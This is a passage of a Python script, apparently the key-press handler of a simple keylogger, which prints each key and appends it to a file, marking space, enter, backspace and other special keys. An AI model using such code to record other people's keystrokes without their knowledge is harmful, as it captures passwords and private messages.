            if hasattr(key,'char'):
                print(f'Key pressed: {key.char}', flush=True)
                f.write(key.char + '\n')
            elif key == keyboard.Key.space:
                print('Key pressed: SPACE', flush=True)
                f.write('SPACE\n')
            else:
                print(f'Special key pressed: {key}', flush=True)
                # Special keys like enter, backspace, shift, etc.
                if key == keyboard.Key.enter:
                    f.write('[ENTER]\n')
                elif key == keyboard.Key.backspace:
                    f.write('[BACKSPACE]\n')
                else:
                    f.write(f'[{key}]\n')
    except Exception as e:
        print(e)

